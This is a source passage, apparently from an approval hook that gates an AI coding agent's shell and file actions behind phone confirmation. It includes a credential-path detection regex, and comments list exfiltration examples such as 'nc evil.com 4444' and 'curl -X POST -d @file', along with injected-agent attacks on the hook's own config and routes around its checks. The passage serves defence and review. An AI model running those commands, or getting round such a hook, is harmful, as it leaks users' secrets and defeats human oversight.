        arg_re = spec.get('arg_re')
        if arg_re is not None and (not arg_re.match(tok)):
            return '带了不认识的参数，可能是在改设置'
        args += 1
        if args > int(spec.get('max_args') or 0):
            return '带了多余的参数，可能是在改设置'
        i += 1
    if allow is not None and allow and (not saw_flag):
        return '没带只读选项，可能是在改设置'
    need = spec.get('need')
    if need is not None and (not need.search(' '.join(_segment(tokens, start)))):
        return '没带限定次数/范围的选项，可能会一直跑或者拉回整份清单'
    return ''
_CRED_PATHS = re.compile('(^|[\\s=\\"\'(:])(~|\\$HOME|\\$\\{HOME\\}|/Users/[^/\\s]+|/home/[^/\\s]+|/root|/etc)?/?\\.?(ssh/|aws/|gnupg/|docker/config|kube/config|netrc|npmrc|pypirc|pgpass|my\\.cnf|git-credentials|keychain|Keychains/)|(^|[\\s=\\"\'(:/])\\.env(\\.[A-Za-z0-9_.-]+)?(\\s|$|[\\"\';)])|\\.(pem|p12|pfx|jks)(\\s|$|[\\"\';)])|\\bid_(rsa|dsa|ecdsa|ed25519)\\b|/etc/(shadow|master\\.passwd|sudoers)|\\.keychain(-db)?\\b|\\.carher-feishu-agent/(config\\.toml|approval\\.secret)|\\.claude-feishu-bridge/|(?i:password|passwd|secret|token|credential|api[_-]?key)[^;&|]*\\s(~|\\$HOME|/Users/|/home/)|\\s-r[a-zA-Z]*\\s+[^;&|]*(~|\\$HOME)/\\.(config|aws|ssh|gnupg)\\b|(^|[\\s=\\"\'(:])(~|\\$HOME|\\$\\{HOME\\}|/Users/[^/\\s]+|/home/[^/\\s]+|/root)/\\.(ssh|aws|gnupg)(?=\\s|$|[\\"\';)/])|/\\.config/(gh|gcloud|rclone|doctl|flyctl|heroku|npm|composer|gspread)\\b|\\bsecurity\\s+(find-(generic|internet)-password|dump-keychain|export)\\b', re.I)

def _touches_credentials(command: str) -> str:
    """这条命令碰到了凭据文件吗。返回原因，空串 = 没碰到。

    只看「命令文本里有没有凭据路径的形状」—— 不做路径解析（运行时才知道真路径），
    宁可多拦：`cat ~/.ssh/config` 也拦住（里面有主机名和私钥路径）。
    """
    if not command:
        return ''
    return '读密钥 / 凭据文件' if _CRED_PATHS.search(command) else ''
_GLOBAL_OPTS_WITH_VALUE = {'git': frozenset({'-C', '-c', '--git-dir', '--work-tree', '--exec-path', '--namespace', '--super-prefix', '--config-env'}), 'kubectl': frozenset({'-n', '--namespace', '--context', '--kubeconfig', '--cluster', '--user', '-s', '--server', '--token', '-l', '--selector'}), 'helm': frozenset({'-n', '--namespace', '--kube-context', '--kubeconfig'}), 'defaults': frozenset({'-host'}), 'diskutil': frozenset(), 'chmod': frozenset(), 'chown': frozenset(), 'launchctl': frozenset()}
_HOME_WORDS = re.compile('^(~|\\$HOME|\\$\\{HOME\\}|/Users/[^/]+|/home/[^/]+|/root|/Users|/home|/)/?$')
_CWD_WORDS = frozenset({'.', './', '*', './*', '.*', './.*', '..', '../'})
_CRED_GLOB = re.compile('(^|/)\\.[A-Za-z]*[?*\\[][^/\\s]*(/|$)')

def _shell_words(text: str) -> list[str] | None:
    try:
        lexer = shlex.shlex(text, posix=True, punctuation_chars=True)
        lexer.whitespace_split = True
        lexer.commenters = ''
        return list(lexer)
    except ValueError:
        return None

def _normalized_for_red_lines(text: str) -> str:
    """把命令按 shell 分词后重新拼成「去引号、去全局选项、cd 落地」的样子，只给红线判用。"""
    words = _shell_words(text)
    if not words:
        return ''
    out: list[str] = []
    cwd_home = False
    i = 0
    at_head = True
    while i < len(words):
        w = words[i]
        if _PUNCTUATION_ONLY.match(w) or w in _SEPARATORS:
            out.append(w)
            at_head = True
            i += 1
            continue
        if at_head:
            at_head = False
            base = w.rsplit('/', 1)[-1]
            out.append(base)
            if base == 'cd':
                target = words[i + 1] if i + 1 < len(words) else '~'
                if _PUNCTUATION_ONLY.match(target) or target in _SEPARATORS:
                    target = '~'
                cwd_home = bool(_HOME_WORDS.match(target))
            opts = _GLOBAL_OPTS_WITH_VALUE.get(base)
            if opts is not None:
                j = i + 1
                while j < len(words) and words[j].startswith('-') and (words[j] != '-'):
                    name = words[j].split('=', 1)[0]
                    j += 2 if name in opts and '=' not in words[j] else 1
                    if base in ('chmod', 'chown', 'diskutil', 'defaults', 'launchctl'):
                        if 'R' in name and name.startswith('-') and (not name.startswith('--')):
                            out.append('-R')
                i = j
                continue
            i += 1
            continue
        if base_is_rm(out) and cwd_home and (w in _CWD_WORDS):
            out.append('~')
        else:
            out.append(w)
        i += 1
    return ' '.join(out)

def base_is_rm(out: list[str]) -> bool:
    """当前这一段的命令名是不是 rm（往回找到最近的分隔符）。"""
    for w in reversed(out):
        if _PUNCTUATION_ONLY.match(w) or w in _SEPARATORS:
            return False
        if w == 'rm':
            return True
    return False

def never_approvable(command: str) -> str:
    """这条命令是不是"连点同意都不许做"。返回原因，空串表示可以批准。

    给审批层用：`ApprovalGate.approve` 在写 `.ok` 之前问一次。
    这样用户在手机上点错也不会造成不可逆损失。
    原文和规范化文本（见上面第 25 轮那段）各判一次，任一命中就算。
    """
    text = (command or '').strip()
    if not text:
        return ''
    normalized = _normalized_for_red_lines(text)
    for candidate in (text, normalized):
        if not candidate:
            continue
        cred = _touches_credentials(candidate)
        if cred:
            return cred
    if normalized and any((_CRED_GLOB.search(w) and re.search('(^|/)(~|\\$HOME|/Users/|/home/|/root)', w) for w in normalized.split())):
        return '读密钥 / 凭据文件'
    for candidate in (text, normalized):
        if not candidate:
            continue
        for pattern, reason in _NEVER_APPROVABLE:
            if pattern.search(candidate):
                return reason
    return ''
_SYSTEM_PREFIXES = ('/dev/', '/tmp/', '/private/tmp/', '/var/tmp/', '/private/var/folders/', '/var/folders/', '/usr/', '/bin/', '/sbin/', '/opt/', '/System/', '/Library/', '/proc/', '/sys/', '/etc/')
_SYSTEM_EXACT = frozenset({'/dev/null', '/dev/stdin', '/dev/stdout', '/dev/stderr', '/tmp', '/usr', '/bin', '/opt', '/etc'})
_PATH_LIKE = re.compile('^(?:/|~/|~$)')
_RELATIVE_LIKE = re.compile('^(?:\\.\\.?(?:/|$)|[^-][^\\s]*/)')
_EXPANDS = re.compile('\\$|`')

def _is_system_path(path: str) -> bool:
    if path in _SYSTEM_EXACT:
        return True
    return any((path.startswith(prefix) for prefix in _SYSTEM_PREFIXES))
_PG_PROGRAM_CMDS = frozenset({'awk', 'gawk', 'mawk', 'nawk', 'sed', 'gsed', 'grep', 'egrep', 'fgrep', 'rg', 'jq'})
_PG_PROGRAM_FROM_FILE = ('--file', '--regexp', '--expression', '--from-file', '--source', '--include')
_PG_VALUE_OPTS = {'awk': frozenset({'-F', '-v'}), 'gawk': frozenset({'-F', '-v'}), 'mawk': frozenset({'-F', '-v'}), 'nawk': frozenset({'-F', '-v'}), 'grep': frozenset({'-m', '-A', '-B', '-C', '--include', '--exclude', '--exclude-dir', '--color'}), 'egrep': frozenset({'-m', '-A', '-B', '-C'}), 'fgrep': frozenset({'-m', '-A', '-B', '-C'}), 'rg': frozenset({'-g', '--glob', '-t', '--type', '-T', '-m', '-A', '-B', '-C', '-M'}), 'jq': frozenset({'--arg', '--argjson', '--indent'})}
_PG_PATHS_NOT_READ = frozenset({'df'})
_PG_SUBSTITUTION = re.compile('\\$\\(|`|<\\(|>\\(')
_PG_SEPARATORS = frozenset({';', '&&', '||', '|', '&', '|&', '(', ')', '{', '}', '!', 'do', 'then', 'else'})

def _pg_skipped_indexes(tokens: list[str]) -> set:
    """哪几个 token 是程序文本 / 只用来定位挂载点的参数 ⇒ 不当路径查。判不准的一律不跳。"""
    skip: set = set()
    i = 0
    while i < len(tokens):
        if tokens[i] in _PG_SEPARATORS or tokens[i].startswith(('>', '<')):
            i += 1
            continue
        head = tokens[i].rsplit('/', 1)[-1]
        j = i + 1
        end = j
        while end < len(tokens) and tokens[end] not in _PG_SEPARATORS:
            end += 1
        if head in _PG_PATHS_NOT_READ:
            for k in range(j, end):
                if not tokens[k].startswith('-') and (not tokens[k - 1].startswith(('>', '<'))) and (not tokens[k].startswith(('>', '<'))):
                    skip.add(k)
        elif head in _PG_PROGRAM_CMDS:
            values = _PG_VALUE_OPTS.get(head, frozenset())
            from_file = False
            k = j
            while k < end:
                tok = tokens[k]
                if tok == '--':
                    k += 1
                    break
                if tok.startswith('--'):
                    if tok.split('=', 1)[0] in _PG_PROGRAM_FROM_FILE:
                        from_file = True
                    k += 2 if tok in values else 1
                    continue
                if tok.startswith('-') and len(tok) > 1:
                    if tok in values:
                        k += 2
                        continue
                    letters = tok[1:]
                    if 'e' in letters or 'f' in letters:
                        from_file = True
                    k += 1
                    continue
                break
            if not from_file and k < end and (not tokens[k].startswith(('>', '<'))):
                skip.add(k)
        i = end
    return {k for k in skip if not _PG_SUBSTITUTION.search(tokens[k])}

def _candidate_paths(command: str) -> list[str]:
    """抽出命令里看起来是路径的 token（绝对、相对、带展开的）。

    🔴 用 `posix=False` 分词保留引号原样？不 —— 用 posix 分词拿到去引号后的值，
    但**展开符号要在原始命令上判**：单引号里的 `$HOME` 不会被 shell 展开，
    却会被我们当成展开。宁可多问一次（误判成越界 = 弹卡片），不要漏放。
    分词失败就退化成按空白切：宁可多抓几个候选，也别漏掉一个真路径。
    """
    skip: set = set()
    try:
        lexer = shlex.shlex(command, posix=True, punctuation_chars=True)
        lexer.whitespace_split = True
        tokens = list(lexer)
        skip = _pg_skipped_indexes(tokens)
    except ValueError:
        tokens = command.split()
    found = []
    for index, token in enumerate(tokens):
        if index in skip:
            continue
        cleaned = token
        if '=' in token:
            cleaned = token.split('=', 1)[1]
        if not cleaned:
            continue
        if _EXPANDS.search(cleaned):
            if '/' in cleaned or re.fullmatch('\\$\\{?HOME\\}?|~', cleaned):
                found.append(cleaned)
            continue
        if _PATH_LIKE.match(cleaned) or _RELATIVE_LIKE.match(cleaned):
            found.append(cleaned)
    return found

def _outside_workspace(command: str, workspaces: tuple[str, ...], cwd: str='') -> str:
    """命令里有没有伸出 workspace 的路径。返回越界的那个，空串表示没有。

    workspaces 是 `Policy.workspaces`（绝对路径元组）。
    cwd 是这条命令执行时的工作目录（钩子事件里带 `cwd`）；不给就按第一个 workspace。
    """
    if not command or not workspaces:
        return ''
    roots = []
    for workspace in workspaces:
        try:
            roots.append(os.path.realpath(os.path.expanduser(workspace)))
        except OSError:
            continue
    if not roots:
        return ''
    base = cwd or roots[0]
    for raw in _candidate_paths(command):
        if _EXPANDS.search(raw):
            return raw
        expanded = os.path.expanduser(raw)
        if not os.path.isabs(expanded):
            expanded = os.path.join(base, expanded)
        if _is_system_path(expanded):
            continue
        try:
            resolved = os.path.realpath(expanded)
        except OSError:
            resolved = expanded
        if _is_system_path(resolved):
            continue
        if any((resolved == root or resolved.startswith(root + os.sep) for root in roots)):
            continue
        return raw
    return ''


def digest(tool_name: str, tool_input: dict) -> str:
    # 规范化后哈希：同一个操作每次要得到同一个指纹，否则 resume 时对不上。
    # 只算「决定这一步做什么」的字段，见 _DIGEST_FIELDS 的红字。
    payload = json.dumps(
        {"tool": tool_name, "input": _digest_material(tool_name, tool_input)},
        sort_keys=True,
        ensure_ascii=False,
        separators=(",", ":"),
    )
    return hashlib.sha256(payload.encode()).hexdigest()[:24]


# 🔴 2026-11-05 实测：同一条生图命令，模型第一次带 timeout=180000，被打断后重发时
# 改成了 300000 —— 原来对整个 tool_input 求指纹，于是指纹变了、批准对不上、又弹一张卡。
# timeout / description / run_in_background 只影响「等多久、怎么显示」，不影响做什么。
# 不在表里的工具（MCP 之类）仍按整个输入算：它们的 description 可能就是正文。
# 值是 None / False 的字段当成没写（模型有时显式写 replace_all=false，有时不写）。
_DIGEST_FIELDS = {
    "Bash": ("command", "dangerouslyDisableSandbox"),
    "Write": ("file_path", "content"),
    "Edit": ("file_path", "old_string", "new_string", "replace_all"),
    "MultiEdit": ("file_path", "edits"),
    "NotebookEdit": ("notebook_path", "cell_id", "new_source", "cell_type", "edit_mode"),
}


def _digest_material(tool_name, tool_input):
    fields = _DIGEST_FIELDS.get(tool_name)
    if fields is None or not isinstance(tool_input, dict):
        return tool_input
    return {
        key: tool_input[key]
        for key in fields
        if key in tool_input and tool_input[key] is not None and tool_input[key] is not False
    }


def _load_workspaces(directory):
    """读服务端写下的 workspace 清单。读不到就返回空 ⇒ 不做路径判断
    （保守方向：让 `_is_safe` 那层继续管，别因为缺个文件就全部要审批）。"""
    try:
        with open(os.path.join(directory, "workspaces.json"), encoding="utf-8") as fh:
            data = json.load(fh)
        return tuple(x for x in data if isinstance(x, str)) if isinstance(data, list) else ()
    except (OSError, ValueError):
        return ()


def pending_path_for(directory, tool_name, tool_input):
    return os.path.join(directory, digest(tool_name, tool_input) + ".pending")


def _is_safe(tool_name: str, tool_input: dict, directory: str) -> bool:
    """这次调用是不是只读操作 ⇒ 不用弹卡片。

    🔴 原来按**整条命令**匹配安全前缀，而且含 `; | & > $(` 任一就一律不放行。
    后果是用户问一句「看看我有哪些项目」收到 **15 张卡片**，全是只读命令 ——
    agent 为省轮次天然写 `for d in */; do git -C "$d" status; done` 这种复合命令。

    现在改成真解析 shell 结构（判据和两边的清单都在 cmdclass.py，这里是它的副本
    —— 钩子是独立进程、只能用标准库，没法 import 包内模块。
    `tests/test_cmdclass.py::test_hook_copy_matches_module` 盯着两边一致）。
    """
    if tool_name != "Bash":
        return False  # Write/Edit 这类一律要确认
    command = str(tool_input.get("command") or "")
    return _classify_readonly(command)


def decide(decision: str, reason: str) -> None:
    print(json.dumps({
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": decision,
            "permissionDecisionReason": reason,
        }
    }))
    sys.exit(0)


# 桥自己的家（主人名单、令牌密钥、审批标记）和 ~/.ssh **任何档位都不让写** ——
# 哪怕有人把 `~` 配成了工作目录、哪怕是全授权。写进去 = 换主人 / 伪造批准 / 远程登录。
_PROTECTED_DIRS = (".carher-feishu-agent", ".claude-feishu-bridge", ".ssh")


def _is_protected(resolved: str) -> bool:
    home = os.path.realpath(os.path.expanduser("~"))
    for name in _PROTECTED_DIRS:
        root = os.path.join(home, name)
        if resolved == root or resolved.startswith(root + os.sep):
            return True
    return False


def _resolve_target(target: str, workspaces, cwd: str) -> str:
    path = os.path.expanduser(target)
    if not os.path.isabs(path):
        base = cwd or (os.path.expanduser(workspaces[0]) if workspaces else os.getcwd())
        path = os.path.join(base, path)
    try:
        return os.path.realpath(path)
    except OSError:
        return path


def _write_inside(target: str, workspaces, cwd: str) -> bool:
    """写文件的目标是否在工作目录内。**比读严**：没有系统目录豁免。

    读路径放过 `/tmp` `/etc` `/Library`（系统只读区，挡了会让正常命令都弹卡片），
    但写不能放 —— `/Library/LaunchDaemons`、`/etc/...` 正是持久化的落点。
    `/tmp` 也不放：没有正当理由让 agent 往工作目录外写东西。
    """
    if not workspaces:
        return False
    path = os.path.expanduser(target)
    if not os.path.isabs(path):
        base = cwd or os.path.expanduser(workspaces[0])
        path = os.path.join(base, path)
    try:
        resolved = os.path.realpath(path)
    except OSError:
        return False
    if _is_protected(resolved):
        return False
    for workspace in workspaces:
        try:
            root = os.path.realpath(os.path.expanduser(workspace))
        except OSError:
            continue
        if resolved == root or resolved.startswith(root + os.sep):
            return True
    return False


def main() -> None:
    try:
        event = json.load(sys.stdin)
    except Exception:
        # 读不到输入就不要替用户做决定 —— 交回默认流程（白名单仍然兜底）。
        decide("ask", "审批钩子收不到输入")

    tool_name = event.get("tool_name") or ""
    tool_input = event.get("tool_input") or {}
    cwd = str(event.get("cwd") or "")
    directory = os.environ.get("CARHER_APPROVAL_DIR") or ""
    if not directory:
        decide("ask", "审批目录没配置")
    workspaces = _load_workspaces(directory)
    session_id = str(event.get("session_id") or "")

    # 第 32 轮：确认卡挂着时他打了一句话 ⇒ 这一步当没批，原话交给模型（照 T3 Code 的
    # `behavior:"deny", message`）。2026-11-09 用真 claude 实测：defer 之后 `--resume` 加新话，
    # Claude Code 会**用同一个 tool_use_id 再调一次钩子**；这里 deny ⇒ 会话里那条 tool_result
    # 就是下面这句（原来是 `[Tool result missing due to internal error]`，模型不知道是你没批）。
    # 只会更严：deny 永远不放行任何东西，红线照样挡（下面那段在它之后也是 deny）。
    reply = _take_reply(directory, digest(tool_name, tool_input), session_id)
    if reply is not None:
        if reply:
            decide("deny", "这不是出错：用户在聊天里没批这一步，命令没有执行。"
                           f"他回的是：「{reply}」——这句话也就是你接下来收到的那条用户消息。")
        decide("deny", "这不是出错：用户在聊天里没批这一步，命令没有执行。")

    # 🔴 红线：**任何档位都不放**，在全授权快捷通道之前判。
    # 2026-11-04 review 实测：trusted 下 `python3 -c "shutil.rmtree(~)"` 原来直接 allow，
    # 而确认卡和 /status 都对用户承诺「仍挡着删家目录」。`never_approvable` 只在
    # 点同意时查（ApprovalGate.approve），全授权根本走不到那里。
    # 代价：全授权下 `python3 -c` 这类一行脚本也会被拒 —— 那正是"一句话执行任意代码"，
    # agent 可以写成文件再跑（Write 受下面的工作目录检查约束）。
    if tool_name == "Bash":
        red = never_approvable(str(tool_input.get("command") or ""))
        if red:
            # 第 32 轮：照 T3 Code 那段拒绝语改。原来只有一句「任何模式下都不做」，模型常当成
            # 「用户拒了」去追问他，或者拆开、写成脚本换个形状再试一次。
            decide("deny", f"这是安全规则拦的，不是用户拒的：{red}。"
                           "不许拆开、写成脚本或换工具绕过；做不了就跳过这一步，"
                           "告诉用户你本来要做什么、为什么。")

    # 🔴 写文件的路径也要在工作目录内，在全授权之前判。
    # 2026-11-04 review 实测：trusted 下 Write 到 ~/.carher-feishu-agent/config.toml
    # 原来直接 allow —— 被注入的 agent 能把自己加进 owner_open_ids、或写 ~/.ssh/authorized_keys，
    # 一张卡片都不弹。读边界一直有，写边界之前漏了。
    trusted = os.path.exists(os.path.join(directory, "TRUSTED"))
    if tool_name in ("Write", "Edit", "NotebookEdit", "MultiEdit"):
        target = str(tool_input.get("file_path") or tool_input.get("notebook_path") or "")
        if target and _is_protected(_resolve_target(target, workspaces, cwd)):
            decide("deny", f"{target} 是助手自己的配置或登录密钥，任何模式下都不许改")
        # 🔴 第 39 轮（用户 11-19 拍板：「都改成 bypass」，红线保留）：全授权下项目外也不问就写
        if target and not trusted and not _write_inside(target, workspaces, cwd):
            decide("deny", f"只能改工作目录里的文件，{target} 在范围外")

    # 路径越界：命令碰到 workspace 之外的用户数据 ⇒ 要审批。
    # 工具作用域（`Read(<目录>/**)`）管不到 Bash —— 实测 `cat <目录外文件>`
    # 照样能读到，因为命令里的路径是运行时才知道的。
    if tool_name == "Bash":
        command = str(tool_input.get("command") or "")
        outside = _outside_workspace(command, workspaces, cwd)
        # 🔴 第 16 轮（用户原话：「终端历史、桌面、下载、别的项目都在外面，这些都是基本的
        # 查阅操作，为啥还有弹卡呢，要做放开到整台电脑」）：
        # **全授权 + 这条命令是只读 ⇒ 目录外也放行**。读边界原来排在全授权前面，
        # 于是「看一眼终端历史」「看看桌面上有什么」全要弹卡，而那正是远程看电脑的主要用途。
        # 放开的前提（同一轮上的）：`cmdclass._touches_credentials` 把凭据路径升成了
        # **连点同意都不许**的红线（上面 never_approvable 那一段），所以
        # `cat ~/.ssh/id_rsa` 走不到这里就被 deny 了。
        # 🔴 只放「读」：会写的命令照旧要卡（写只许在工作目录里），只读档也照旧弹卡。
        if outside and trusted:
            # 🔴 第 39 轮（用户 11-19 拍板「都改成 bypass」，四样红线保留）：
            # 全授权下**项目外也不问就做**，读写都放。上面的红线（删家目录、git push、
            # 读凭据、sudo …）已经先判过了，走不到这里。
            # 只剩一样照旧挡：**会写的命令**碰到桥自己的家 / ~/.ssh（换主人、伪造批准、远程登录）。
            # 按子串查而不是按解析出的路径：`$HOME/.carher-feishu-agent` 这种展开后才知道的也要拦。
            if not _classify_readonly(command) and any(n in command for n in _PROTECTED_DIRS):
                decide("deny", "这是安全规则拦的，不是用户拒的：不能改助手自己的配置或登录密钥。"
                               "不许拆开、写成脚本或换工具绕过；做不了就跳过这一步，告诉用户你本来要做什么。")
            decide("allow", "全授权模式：项目外也不问就做")
        if outside and _only_granted_scripts(command, workspaces, cwd, directory, session_id):
            # 这条命令伸出工作目录的**只有**本会话批准过的生图/生视频脚本 ⇒ 不再按越界拦，
            # 但也**不直接放行**：往下照常按档位判（只读/可改档照样要问，全授权才放）。
            outside = ""
        if outside:
            # 🔴 2026-11-05 实测：这里原来**不看 .ok** 就 defer。用户点了同意 ⇒ 写下 .ok ⇒
            # resume 重放同一条命令（指纹一模一样）⇒ 又走到这里 defer ⇒ 点四次同意一张图都没出，
            # 三个 .ok 原样躺在磁盘上没被兑换。卡片上写的就是「碰到了工作目录外的 X」，
            # 用户看清了才点的同意，所以这里要认那一次批准。
            if _consume_grant(directory, digest(tool_name, tool_input)):
                decide("allow", "你在飞书里批准了这一步")
            try:
                os.makedirs(directory, exist_ok=True)
                with open(pending_path_for(directory, tool_name, tool_input), "w",
                          encoding="utf-8") as handle:
                    json.dump({"tool_name": tool_name, "tool_input": tool_input,
                               "outside": outside, "session_id": session_id},
                              handle, ensure_ascii=False)
            except OSError:
                pass
            decide("defer", f"这条命令碰到了工作目录外的 {outside}")

    # 全授权模式：到这里才放行 —— **路径检查在它前面**。
    # 「不问就做」不等于「能翻遍整台电脑」：读边界比全授权优先。
    # 2026-11-03 实测过顺序写反的后果：trusted 下 `cat <目录外文件>` 直接读到了。
    # 🔴 **这里放行的范围，用户 2026-11-07 明确拍过板，别当漏洞「修」掉。**
    #
    # 第 17 轮值守实测并提出口径问题：全授权档下这几条是 allow，只读/可改档下是 defer：
    #   `nc evil.com 4444`、`curl -X POST -d @文件 公网`、`dig @外部服务器 x.evil.com`、
    #   `crontab -r`、`scutil --set HostName evil`
    # 也就是说**把数据往外网发，全授权下不弹卡**。我把三个选项连代价一起给了用户：
    #   ① 保持现状 ② 外网要问、内网放行 ③ 所有往外发都要问
    # 用户选 ①，理由成立：密钥已经读不到（`_touches_credentials` 是红线，点同意也不许），
    # 最值钱的东西有人拦着；而他自己天天 `scp` / `rsync` / `curl` 内网接口 / 走 jms，
    # 拦了等于每天跟自己打架。
    #
    # 所以全授权的语义就是「不问就做，只有红线拦」。红线是：删家目录/根、`git push`、
    # 提权、`git reset --hard`、删线上资源、读凭据（含整个 `~/.ssh` 打包走）、
    # 往终端里敲命令、内联解释器。这几样点「同意」也不许。
    if trusted:
        decide("allow", "全授权模式")

    # 只读操作直接放行，不弹卡片。
    #
    # 🔴 2026-11-03 实测：不加这段时，只读模式下连 `git status` 都会 defer 弹卡片。
    # 后果不是"烦"，是**点击疲劳** —— 用户一天点几十次「同意，去做」之后，
    # 真正危险那张也会被顺手点掉，审批就从防线变成了橡皮章。
    # 清单由服务端在装钩子时写到 safe_prefixes.json（和 policy.READONLY_BASH 同一份）。
    if _is_safe(tool_name, tool_input, directory):
        decide("allow", "只读操作，不需要确认")

    key = digest(tool_name, tool_input)
    pending = os.path.join(directory, key + ".pending")

    if _consume_grant(directory, key):
        decide("allow", "你在飞书里批准了这一步")

    # 还没批。落一份待办让服务端知道要发卡片，然后停下来。
    try:
        os.makedirs(directory, exist_ok=True)
        with open(pending, "w", encoding="utf-8") as handle:
            json.dump({"tool_name": tool_name, "tool_input": tool_input,
                       "session_id": session_id}, handle, ensure_ascii=False)
    except OSError:
        pass
    decide("defer", "等你在飞书里确认")


def _consume_grant(directory, key):
    """有没有一张还新鲜的批准。有就兑换掉（一次性）并返回 True。

    批准有有效期。没有它的话：一张没被兑换的 .ok 会一直躺在磁盘上，
    以后任何一轮跑到同样的命令都会被直接放行 —— 一次点击换一张长期通行证
    （2026-11-03 实测：批准后发 /new，新会话同样命令直接 allow）。
    过期的也删掉，当没批准（重新发卡片）。
    """
    approved = os.path.join(directory, key + ".ok")
    if not os.path.exists(approved):
        return False
    try:
        age = time.time() - os.path.getmtime(approved)
    except OSError:
        age = 1e9
    try:
        os.unlink(approved)   # 一次性：无论过期与否都消费掉
    except OSError:
        pass
    return age <= _GRANT_TTL_SEC


def _take_reply(directory, key, session_id):
    """卡挂着时他回的那句话（服务端已脱敏写下）。有就兑换掉（一次性）并返回原话，没有返回 None。

    只认同一个 claude 会话、还新鲜的（同 `.ok` 的有效期）：别让一句旧话把以后同样的命令也拦了。
    读坏了也当「没批」（返回空串）—— 往更少发生的方向错。
    """
    path = os.path.join(directory, key + ".deny")
    if not os.path.exists(path):
        return None
    try:
        age = time.time() - os.path.getmtime(path)
    except OSError:
        age = 1e9
    try:
        with open(path, encoding="utf-8") as handle:
            data = json.load(handle)
    except (OSError, ValueError):
        data = {}
    try:
        os.unlink(path)
    except OSError:
        pass
    if not isinstance(data, dict):
        data = {}
    if age > _GRANT_TTL_SEC:
        return None
    owner = str(data.get("session_id") or "")
    if owner and session_id and owner != session_id:
        return None
    return str(data.get("text") or "")


# 用户自己的生图 / 生视频脚本（见用户全局 CLAUDE.md 的「画图」「生成视频」）。
# 🔴 **不当系统工具无条件放行**：它们会把结果写到命令里给的任意输出路径
# （`fs.writeFileSync(out)`），无条件放行 = 往工作目录外任意位置写文件的口子；
# `carher_models_refresh.js` 还会改 ~/.claude/settings.json，根本不在这张表里。
# 所以只做到：**本会话里点过一次同意，同一个脚本后面再跑就不再按越界拦**，
# 输出路径仍要在工作目录内、档位照常判。
_SESSION_SCRIPT_DIR = "~/.claude/carher"
_SESSION_SCRIPT_NAMES = frozenset({"carher_image.js", "carher_video.js"})
_SCRIPT_GRANT_TTL_SEC = 12 * 3600


def session_script_path(raw):
    """命令里这个路径是不是那几个可按会话放行的脚本。是就返回 realpath，否则空串。"""
    if not raw or re.search(r"\$|`", raw):
        return ""
    try:
        resolved = os.path.realpath(os.path.expanduser(raw))
        root = os.path.realpath(os.path.expanduser(_SESSION_SCRIPT_DIR))
    except OSError:
        return ""
    if os.path.dirname(resolved) != root:
        return ""
    if os.path.basename(resolved) not in _SESSION_SCRIPT_NAMES:
        return ""
    return resolved if os.path.isfile(resolved) else ""


def script_grant_name(script):
    return hashlib.sha256(script.encode()).hexdigest()[:24] + ".script"


def _exec_position_paths(command):
    """命令里处于「要被执行」位置的 token：解释器后第一个非选项参数，或分隔符后的第一个词。

    `node /path/x.js out.png` ⇒ 含 /path/x.js；`cp a /path/x.js` ⇒ 不含。
    分词失败返回空集（宁可多问一次）。
    """
    interp = ("node", "python", "python3", "ruby", "perl", "bash", "sh", "zsh",
              "deno", "bun", "osascript")
    try:
        tokens = shlex.split(command, comments=False)
    except ValueError:
        return set()
    out = set()
    start = True
    for i, tok in enumerate(tokens):
        if tok in (";", "&&", "||", "|", "&"):
            start = True
            continue
        if start:
            out.add(tok)
            base = os.path.basename(tok)
            if base in interp or base.rstrip("0123456789.") in interp:
                for nxt in tokens[i + 1:]:
                    if nxt.startswith("-"):
                        continue
                    out.add(nxt)
                    break
            start = False
    return out


def _only_granted_scripts(command, workspaces, cwd, directory, session_id):
    """命令伸出工作目录的路径是不是**全部**都是本会话批准过的脚本。

    任何一个别的越界路径（比如输出写到工作目录外）⇒ False，照常要审批。
    钩子事件不带 session_id ⇒ False（认不出是不是同一个会话就不放）。
    """
    if not session_id or not directory:
        return False
    runnable = _exec_position_paths(command)
    found = False
    for raw in _candidate_paths(command):
        if not _outside_workspace(shlex.quote(raw), workspaces, cwd):
            continue
        script = session_script_path(raw)
        if not script:
            return False
        # 🔴 **脚本必须在「要被执行」的位置**（紧跟解释器，或自己就是第一个词）。
        # 2026-11-05 安全审查实测：原来只看「这个路径是不是批准过的脚本」，于是同意过一次
        # 生图之后，`cp evil.js <脚本>` 和 `rm <脚本>` 在全授权档下**静默放行** ——
        # 一次「同意跑这个脚本」变成了「可以改写/删掉它」，下次生图跑的就是别人的代码。
        if raw not in runnable:
            return False
        try:
            with open(os.path.join(directory, script_grant_name(script)), encoding="utf-8") as fh:
                grant = json.load(fh)
        except (OSError, ValueError):
            return False
        if not isinstance(grant, dict) or grant.get("session_id") != session_id \
                or grant.get("script") != script:
            return False
        if time.time() - float(grant.get("at") or 0) > _SCRIPT_GRANT_TTL_SEC:
            return False
        found = True
    return found


if __name__ == "__main__":
    main()
'''


def action_digest(tool_name: str, tool_input: dict) -> str:
    """和钩子里的 digest 必须完全一致，否则 resume 时对不上。

    这里和钩子各写一份是故意的：钩子必须自包含（独立进程、只用标准库）。
    两边一致由 tests/test_approval.py 的对照测试保证。

    🔴 只算决定行为的字段（Bash 只看 command）。2026-11-05 实测：模型重发同一条命令时
    把 timeout 从 180000 改成 300000，整包求指纹 ⇒ 批准对不上 ⇒ 同一步反复弹卡。
    """
    payload = json.dumps(
        {"tool": tool_name, "input": _digest_material(tool_name, tool_input)},
        sort_keys=True,
        ensure_ascii=False,
        separators=(",", ":"),
    )
    return hashlib.sha256(payload.encode()).hexdigest()[:24]


# 和钩子里的 _DIGEST_FIELDS / _digest_material 一字不差（对照测试盯着）。
_DIGEST_FIELDS = {
    "Bash": ("command", "dangerouslyDisableSandbox"),
    "Write": ("file_path", "content"),
    "Edit": ("file_path", "old_string", "new_string", "replace_all"),
    "MultiEdit": ("file_path", "edits"),
    "NotebookEdit": ("notebook_path", "cell_id", "new_source", "cell_type", "edit_mode"),
}


def _digest_material(tool_name, tool_input):
    fields = _DIGEST_FIELDS.get(tool_name)
    if fields is None or not isinstance(tool_input, dict):
        return tool_input
    return {
        key: tool_input[key]
        for key in fields
        if key in tool_input and tool_input[key] is not None and tool_input[key] is not False
    }


# 和钩子里同名的那几个一字不差（tests/test_approval.py 对照）。为什么不无条件放行见钩子里的红字。
_SESSION_SCRIPT_DIR = "~/.claude/carher"
_SESSION_SCRIPT_NAMES = frozenset({"carher_image.js", "carher_video.js"})


def session_script_path(raw):
    """命令里这个路径是不是那几个可按会话放行的脚本。是就返回 realpath，否则空串。"""
    if not raw or re.search(r"\$|`", raw):
        return ""
    try:
